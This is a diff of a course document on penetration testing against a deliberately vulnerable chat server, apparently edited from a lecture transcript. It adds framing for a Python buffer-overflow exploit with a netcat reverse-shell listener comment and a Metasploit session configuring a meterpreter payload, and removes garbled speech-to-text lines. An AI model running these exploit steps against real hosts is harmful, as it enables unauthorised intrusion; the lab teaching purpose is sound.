@@ -97,6 +97,11 @@ You are a programming guru. You tell your customer: It's easy; just
 use python to program a tool? Here are the programming documents. 
 So you sell you this brochure on how to program a penetration testing tool.
 
+Below is example Python code attacking our vulnerable chat server.
+If it succeeds, vchat is not patched and vulerable.
+So the code is kind of a testing tool.
+To program the Python code, you need know general Python, socket library, struct library, the vulnerability and how to use a metasploit tool called msfvenom to generate the malware code. The code has heavy comments. You can read it to have an idea of such programming.
+
 ```
 # To receive the reverse shell, run the following command at another terminal
 #   nc -l -v -p 4444
@@ -159,9 +164,12 @@ PAYLOAD = (
 
 with socket.create_connection((HOST, PORT)) as fd:
     fd.sendall(PAYLOAD)
-
 ```
 
+Apparently, a lot of training is need to program the Python code. Asking customers to program a tool is non-sense.
+This is the worst way of helping customers in penetration testing.
+
+### Using metasploit
 
 is using metasploit so minus plus you
 have to run a few commands a lot of
@@ -177,118 +185,28 @@ the print testers okay
 so the first option is a programming or
 two
 and uh
-so anybody here can program a
-penetration testing tool
-do you know how to start
-you need a lot of knowledge actually to
-start it
-and you have to learn network
-programming it's called a software
-programming
-you have to learn gui programming is a
-graphical user interface programming
-right
-because you want to give user interface
-you have to learn many other things to
-actually design the tool and the program
-materials so you can see here you know
-many people cannot do it
-and uh so here this is the first step
-let me show you here
-so this is a one example of the two here
-so basically here i show you
-how you can actually program
-to
-hack
-the valuable server our volleyball chat
-server here
-and this is the python prover so i'll go
-through this quickly
-and you can see at the line one
-uh the
-lines one two seven
-uh the lines one
-two three are comments
-then line four
-reach
-import stoppage so that's python socket
-programming library so you need that to
-actually send a package to the target
-computer okay
-so under line five and the line six we
-have comments
-so analyze
-seven here is import struct so this is a
-importing a module called start it has
-many other kind of uh
-things you can use many other apis you
-can use so that's a
-another
-library of another class
-and the line eight so you specify
-the mixing id so you specify which ip
-you want to actually
-try and see if it has the variable
-server see if it's vulnerable right
-so at nine nine it's port number 9999 so
-that's uh
-where our volleyball track server
-running right
-okay
-and then here on the right here
-is actually payload so you have to
-generate
-possible
-payloads possible mirror so that when
-you export
-the vulnerable child server portability
-this kid will run and we discuss about
-corroboree you know so we are going to
-send the mirror code and the mirror code
-will run when the function returns right
-so that's the payload you have to use a
-two over there the two is called the rms
-value and then so you use that tool to
-generate the payload okay
-so so you have to know the other two
-first okay
-and then
-finally i'm going to construct the
-pillow you remember we mentioned the
-message we are constructing another one
-meaning by the message right but it's
-not a violent battle in this case
-you can see here we are doing the 946
-that's a possible command of
-the valuable test server so because that
-command has a problem so i'm targeting
-that
-chat
-not command
-then you can see i'm putting
-uh some padding over there then payload
-and other things the shell is our pillow
-and so basically that's the basic i'm a
-construction
-now at the line 57 and 9 feet of h we
-actually stand out of the pair
-anybody here can actually program this
-uh
-i mean two
-nobody here
-so it takes time to learn right so do
-you want this option when you want to
-sell to your customer go ahead and
-program
-the tool and then you can scan anything
-right of course they can scan anything
-if they know how to program but again it
-takes a lot of time
-and uh
-so
-so here
-this actual slides i convert my new size
-here
+
+
+Let’s assume somebody created the attack module for Metasploit
+
+msf6 > use exploit/windows/vulnserver/knock
+[\*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/vulnserver/knock) > set RHOSTS 192.168.1.19
+RHOSTS => 192.168.1.19
+msf6 exploit(windows/vulnserver/knock) > set TARGET 0
+TARGET => 0
+msf6 exploit(windows/vulnserver/knock) > set LHOST 192.168.1.4
+LHOST => 192.168.1.4
+msf6 exploit(windows/vulnserver/knock) > set LPORT 19521
+LPORT => 19521
+msf6 exploit(windows/vulnserver/knock) > set PAYLOAD windows/meterpreter/bind_tcp
+PAYLOAD => windows/meterpreter/bind_tcp
+msf6 exploit(windows/vulnserver/knock) > set RPORT 9999
+RPORT => 9999
+msf6 exploit(windows/vulnserver/knock) > exploit -j
+
+
+
 so this is the second approach
 so when you use an armor task actually
 you are using all the commands here i'm
